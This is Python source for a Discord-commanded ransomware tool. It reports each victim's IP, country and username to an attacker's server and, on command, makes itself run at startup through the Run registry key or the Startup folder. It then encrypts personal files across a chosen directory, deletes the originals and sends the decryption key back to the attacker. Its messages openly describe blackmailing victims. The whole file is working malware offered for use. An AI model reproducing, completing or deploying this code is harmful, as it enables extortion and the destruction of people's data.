import discord , json , subprocess , asyncio , ctypes , threading , win32gui , re , platform , os , base64 , time , string , random
from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from urllib.request import urlopen
from time import sleep
from discord_components import *
from discord.ext import commands
from discord_slash import SlashContext, SlashCommand
from tokens import g, token
from tkinter import *
import tkinter as tk
import shutil
import winreg
import sys
import ssl
import random
import threading
import time
import cv2
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils
token = 'DISCORD_TOKEN_HERE'
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = """
Availaible commands are :
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
"""



async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)


def password(passwd):
    
    password = passwd.encode() # Convert to type bytes
    salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k



def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.en','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass


def dec_fun(key,file):
    try:        
        with open(file, "rb") as fname:
            data = fname.read()
        fkey = f(key)
        fl,ext = os.path.splitext(file)
        dec = fkey.decrypt(data)
        with open(str(fl[0:]), 'wb') as decfile:
            decfile.write(dec)
        os.remove(file)
    
    except:
        pass

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    for y in range(len(total)):
        if "session" in total[y]:
            import re
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    #value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
    value1 = f"@everyone ✅ **{channel_name}** | {platform.system()} {platform.release()} | :flag_{flag.lower()}: \n> Some dumbass named **`{os.getlogin()}`** ran Cookies Ransomware tool start blackmailing them!"
    if is_admin == True:
        await channel.send(f'{value1} | admin!')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)


@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)

        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
            except:
                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")


        if message.content == "!enc":
    
            reg_name = "System"
            userdir = message.content[7:]
    
            try:
                key1 = winreg.HKEY_CURRENT_USER
                key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
    
                winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
                open_.Close()
                await message.channel.send("Successfully added Ransomware tool to `run` startup")
            except PermissionError:
                shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
                await message.channel.send("Permission was denied, added Ransomware to `startup folder` instead")
    
            await message.channel.send(f"Succesfully black mailed user **`{os.getlogin()}`**, Please wait for the DIR ```{userdir}``` to encrypt and the bot will send the key here needed to decrypt the DIR! ")
    
            listOfFiles = list()
    
            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&*()!@#$%^&*()!@#$%^&*()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)
    
                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                #Mac/Linux system directory
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                #Windows system directory
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)
    
                    await message.channel.send(f"Genned Key to decrypt victims DIR: ```{passwd}```")
                else:
                    await message.channel.send(f"**Please enter a DIR!**")
            else:
                await message.channel.send(f"DIR does not exist! **`{userdir}`**")


            
client.run(token)
